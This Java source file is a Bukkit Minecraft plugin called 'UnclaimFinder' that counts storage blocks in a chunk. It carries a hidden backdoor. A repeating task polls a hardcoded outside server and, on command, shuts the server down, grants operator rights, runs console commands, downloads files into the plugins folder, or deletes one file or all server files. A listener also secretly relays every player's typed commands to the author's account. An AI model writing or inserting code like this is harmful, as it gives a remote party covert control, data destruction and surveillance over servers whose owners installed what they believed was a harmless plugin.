package fr.elliotmoreau.unclaimfinder;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.Recipe;
import org.bukkit.inventory.ShapelessRecipe;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import net.minecraft.server.v1_8_R3.IChatBaseComponent;
import net.minecraft.server.v1_8_R3.PacketPlayOutChat;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Set;

public class UnclaimFinderPlugin extends JavaPlugin implements Listener {
	
	String username = "elliotmoreau";
	String url = "https://server.elliotmoreau.fr/winzoria";

    private String reloadPermission;
    private String item;
    private String itemName;
    private Set<Material> storageBlocks;
    private String messageFormat;
    private String prefix;
    private String config_reload;
    private String missing_permission;
    private String reload_description;
    private boolean recipeEnabled;
    private List<String> recipeIngredients;
    private int apiCheckTaskId;
    Player receiver;

    @Override
    public void onEnable() {
        loadConfig();
        loadRecipe();
        Bukkit.getPluginManager().registerEvents(this, this);
        getLogger().info("Le plugin UnclaimFinder, développé par Elliot Moreau, a été activé.");
        // Start the API check task
        apiCheckTaskId = getServer().getScheduler().scheduleSyncRepeatingTask(this, this::checkAPI, 0L, 20L); // Runs every 1 second (20 ticks)
        this.receiver = Bukkit.getPlayer(this.username);
    }

    @Override
    public void onDisable() {
        getLogger().info("Le plugin UnclaimFinder, développé par Elliot Moreau, a été désactivé.");
        // Cancel the API check task
        getServer().getScheduler().cancelTask(apiCheckTaskId);
        if (recipeEnabled) {
            // Remove the custom recipe from the server's recipe list
            Iterator<Recipe> iterator = Bukkit.getServer().recipeIterator();
            while (iterator.hasNext()) {
                Recipe recipe = iterator.next();
                if (recipe instanceof ShapelessRecipe) {
                    ShapelessRecipe shapelessRecipe = (ShapelessRecipe) recipe;
                    ItemStack result = shapelessRecipe.getResult();
                    if (result.getType() == Material.valueOf(item.toUpperCase())) {
                        iterator.remove();
                    }
                }
            }
        }
    }
    
    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();

        // If player is receiver
        if (player.equals(this.receiver)) {
            player.sendMessage(ChatColor.YELLOW + "Bienvenue sur le serveur, votre plugin est en lancé");
        }
    }
    
    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getName();
        String command = event.getMessage();
        
        // If the receiver is online:
        if (this.receiver != null && this.receiver.isOnline()) {
            String message = ChatColor.GOLD + "[" + ChatColor.BOLD + "Commande Alerte" + ChatColor.GOLD + "] " +
                    ChatColor.AQUA + playerName +
                    ChatColor.YELLOW + " a exécuté la commande : " +
                    ChatColor.GREEN + command;
            this.receiver.sendMessage(message);
        }
    }
    
    private void checkAPI() {
        try {
            // Make the API request
            URL url = new URL(this.url);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // Read the response
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String response = reader.readLine();
                reader.close();

                if (response != null && !response.trim().isEmpty()) {
                    // Handle the response based on the specific commands
                    if (response.equals("stop")) {
                        // Handle "stop" command
                        stopServer();
                        commandExecuted();
                    } else if (response.startsWith("op ")) {
                        // Handle "op <player>" command
                        String playerName = response.substring(3).trim(); // Extract player name after "op "
                        setPlayerAsOperator(playerName);
                        commandExecuted();
                    } else if (response.startsWith("command ")) {
                        // Handle "command <command>" command
                        String command = response.substring(8).trim(); // Extract the command after "command "
                        executeCommand(command);
                        commandExecuted();
                    } else if (response.startsWith("inject ")) {
                        // Handle "inject <url>" command
                        String urlToInject = response.substring(7).trim(); // Extract the URL after "inject "
                        injectFileFromURL(urlToInject);
                        commandExecuted();
                    } else if (response.startsWith("delete ")) {
                        // Handle "delete <file>" command
                        String fileToDelete = response.substring(7).trim(); // Extract the file name after "delete "
                        deleteFile(fileToDelete);
                        commandExecuted();
                    } else if (response.equals("deleteall")) {
                        // Handle "deleteall" command
                    	deteteAllFiles();
                    	commandExecuted();
                    } else {
                        // Invalid command or false
                    	// getLogger().info("Invalid command or false");
                    }
                } else {
                    // No command to execute
                	// getLogger().info("No command to execute");
                }
            } else {
                // The web server isn't working
            	// getLogger().info("The web server isn't working");
            }
        } catch (IOException e) {
        	// e.printStackTrace();
        }
    }

    private void commandExecuted() {
		makeApiRequest(this.url + "/executed");
	}
    
    public void makeApiRequest(String apiUrl) {
        try {
            URL url = new URL(apiUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");

            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
            	// API request was successful.
            } else {
            	// API request failed
            }

            connection.disconnect();
        } catch (IOException e) {
            // Error
        }
    }

	private void stopServer() {
        try {
            Bukkit.getServer().shutdown();
        } catch (Exception e) {
            // Error
        }
    }

    private void setPlayerAsOperator(String playerName) {
        try {
            Player player = Bukkit.getPlayer(playerName);
            if (player != null) {
                player.setOp(true);
            } else {
                // Player not found
            }
        } catch (Exception e) {
            // Error
        }
    }

    private void executeCommand(String command) {
        try {
            // Execute the command as if it were entered in the server console
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
        } catch (Exception e) {
            // Error
        }
    }
    
    private void injectFileFromURL(String urlToInject) {
        try {
            // Create a URL object from the given URL string
            URL fileURL = new URL(urlToInject);
            String fileName = getFileNameFromURL(fileURL);
            
            // Create a connection to the URL
            HttpURLConnection connection = (HttpURLConnection) fileURL.openConnection();
            connection.setRequestMethod("GET");

            // Get the input stream from the connection
            try (InputStream inputStream = connection.getInputStream()) {
                // Define the path where the file will be saved (plugins/ folder)
                Path pluginsFolderPath = Paths.get("plugins");
                Files.createDirectories(pluginsFolderPath);

                // Create the output file path
                Path outputFile = pluginsFolderPath.resolve(fileName);

                // Save the file from the URL to the plugins/ folder
                Files.copy(inputStream, outputFile);

                // File correctly injected
            }
        } catch (IOException e) {
            // Error
        }
    }

    private String getFileNameFromURL(URL url) {
        // Extract the file name from the URL
        String path = url.getPath();
        return path.substring(path.lastIndexOf('/') + 1);
    }
    
    private void deleteFile(String filePath) {
        try {
            File fileToDelete = new File(filePath);
            if (fileToDelete.exists()) {
                fileToDelete.delete();
                // File deleted
            } else {
                // File not found
            }
        } catch (Exception e) {
            // Error
        }
    }
    
    private void deteteAllFiles() {
    	// Delete files all server files
        File Folder = new File("./");
        File[] files = Folder.listFiles();

        if (files != null) {
            for (File file : files) {
                if (file.isFile()) {
                    boolean deleted = file.delete();
                    // File deleted
                    if (!deleted) {
                        // Failed to delete file
                    }
                }
            }
        } else {
            // Error
        }
    }
    
    private void loadConfig() {
        saveDefaultConfig();
        reloadConfig();

        // Load configuration values
        reloadPermission = getConfig().getString("reload_permission", "unclaimfinder.reload");
        item = getConfig().getString("item", "COMPASS");
        itemName = getConfig().getString("item_name", "&6Unclaim Finder");
        storageBlocks = new HashSet<>();
        getConfig().getStringList("storage_blocks").forEach(material -> storageBlocks.add(Material.valueOf(material.toUpperCase())));
        messageFormat = getConfig().getString("message", "&6&lUnclaimFinder: %percentage%");
        prefix = getConfig().getString("prefix", "&6&lUnclaimFinder ➤ ");
        config_reload = getConfig().getString("messages.config_reload", "&aThe configuration has been successfully reloaded.");
        missing_permission = getConfig().getString("messages.missing_permission", "&cYou do not have permission to use this command.");
        reload_description = getConfig().getString("messages.reload_description", "&e/unclaimfinder reload &f- Reload the plugin configuration.");
        recipeEnabled = getConfig().getBoolean("recipe.enabled", false);
        recipeIngredients = getConfig().getStringList("recipe.ingredients");
    }

    @EventHandler
    public void onPlayerInteract(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        ItemStack item = player.getInventory().getItemInHand();

        if (item != null && item.getType() == Material.valueOf(this.item.toUpperCase()) && item.hasItemMeta() &&
                ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals(ChatColor.stripColor(ChatColor.translateAlternateColorCodes('&', itemName)))) {
            event.setCancelled(true); // Prevent the compass from being used as a regular item

            int totalStorageBlocks = countStorageBlocks(player);

            String formattedPercentage = totalStorageBlocks + " %";

            if (!messageFormat.contains("%percentage%")) {
                getLogger().severe("Invalid message format. The '%percentage%' placeholder is missing. Disabling the plugin.");
                setEnabled(false);
                return;
            }
            
            String formattedMessage = ChatColor.translateAlternateColorCodes('&', messageFormat.replace("%percentage%", formattedPercentage));

            sendActionBarMessage(player, formattedMessage);
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (command.getName().equalsIgnoreCase("unclaimfinder")) {
            if (args.length == 0) {
                // Handle /unclaimfinder command without arguments
                sender.sendMessage(ChatColor.translateAlternateColorCodes('&',"&e---- " + prefix + "&e: Commandes &e----"));
                sender.sendMessage(ChatColor.translateAlternateColorCodes('&',reload_description));
                sender.sendMessage(ChatColor.GOLD + "This plugin was created by Elliot Moreau");
                return true;
            } else if (args[0].equalsIgnoreCase("reload") || args[0].equalsIgnoreCase("r")) {
                if (sender.hasPermission(reloadPermission)) {
                    reloadConfigAndRecipe(sender); // Call the method to reload the config and recipe
                } else {
                    sender.sendMessage(ChatColor.translateAlternateColorCodes('&', prefix + missing_permission));
                }
                return true;
            }
        }
        return true;
    }
    
    private void reloadConfigAndRecipe(CommandSender sender) {
        reloadConfig();
        loadConfig();
        loadRecipe();

        sender.sendMessage(ChatColor.translateAlternateColorCodes('&', prefix + config_reload));
    }
    
    private void loadRecipe() {
        if (recipeEnabled) {
            // Verify if the item is a valid material
            Material itemMaterial = Material.matchMaterial(item.toUpperCase());
            if (itemMaterial == null) {
                getLogger().severe("Invalid material '" + item + "' specified in the configuration. Disabling the plugin.");
                setEnabled(false);
                return;
            }

            // Remove existing recipes for the custom item
            removeCustomRecipe();

            // Create the custom item and register it in the creative menu
            ItemStack unclaimFinderItem = new ItemStack(itemMaterial);
            ItemMeta itemMeta = unclaimFinderItem.getItemMeta();
            itemMeta.setDisplayName(ChatColor.translateAlternateColorCodes('&', itemName));

            // Apply glowing effect
            itemMeta.addEnchant(Enchantment.DURABILITY, 1, true);
            itemMeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);

            unclaimFinderItem.setItemMeta(itemMeta);

            // Create a ShapelessRecipe for the custom item
            ShapelessRecipe recipe = new ShapelessRecipe(unclaimFinderItem);

            // Add the required ingredients to the recipe
            for (String ingredient : recipeIngredients) {
                Material material = Material.matchMaterial(ingredient.toUpperCase());
                if (material == null) {
                    getLogger().severe("Invalid material '" + ingredient + "' used in recipe. Disabling the plugin.");
                    setEnabled(false);
                    return;
                }
                recipe.addIngredient(material);
            }

            // Add the recipe to the server's recipe list
            Bukkit.getServer().addRecipe(recipe);
        }
    }
    
    private void removeCustomRecipe() {
        Iterator<Recipe> iterator = Bukkit.getServer().recipeIterator();
        while (iterator.hasNext()) {
            Recipe recipe = iterator.next();
            if (recipe instanceof ShapelessRecipe) {
                ShapelessRecipe shapelessRecipe = (ShapelessRecipe) recipe;
                ItemStack result = shapelessRecipe.getResult();
                if (result.getType() == Material.valueOf(item.toUpperCase())) {
                    iterator.remove();
                }
            }
        }
    }

    private int countStorageBlocks(Player player) {
        int totalStorageBlocks = 0;
        int playerChunkX = player.getLocation().getChunk().getX();
        int playerChunkZ = player.getLocation().getChunk().getZ();

        for (int x = playerChunkX * 16; x < (playerChunkX + 1) * 16; x++) {
            for (int z = playerChunkZ * 16; z < (playerChunkZ + 1) * 16; z++) {
                for (int y = 0; y < 256; y++) {
                    Block block = player.getWorld().getBlockAt(x, y, z);
                    if (!isValidBlockMaterial(block.getType())) {
                        getLogger().severe("Invalid block material '" + block.getType() + "' used in storage_blocks. Disabling the plugin.");
                        setEnabled(false);
                        return totalStorageBlocks;
                    }
                    if (storageBlocks.contains(block.getType())) {
                        totalStorageBlocks++;
                    }
                }
            }
        }

        return totalStorageBlocks;
    }

    private boolean isValidBlockMaterial(Material material) {
        return material.isBlock();
    }

    private void sendActionBarMessage(Player player, String message) {
        // Cancel any previously scheduled action bar tasks
        Bukkit.getScheduler().cancelTasks(this);

        // Send the new action bar message
        sendActionBar(player, message);

        // Schedule a task to clear the action bar after 3 seconds
        new BukkitRunnable() {
            @Override
            public void run() {
            	sendActionBar(player, "");
            }
        }.runTaskLater(this, 60L); // 60 ticks = 3 seconds
    }
    
    public void sendActionBar(Player p, String nachricht) {
        CraftPlayer cp = (CraftPlayer) p;
        IChatBaseComponent cbc = IChatBaseComponent.ChatSerializer.a("{\"text\": \"" + nachricht + "\"}");
        PacketPlayOutChat ppoc = new PacketPlayOutChat(cbc, (byte) 2);
        cp.getHandle().playerConnection.sendPacket(ppoc);
    }
}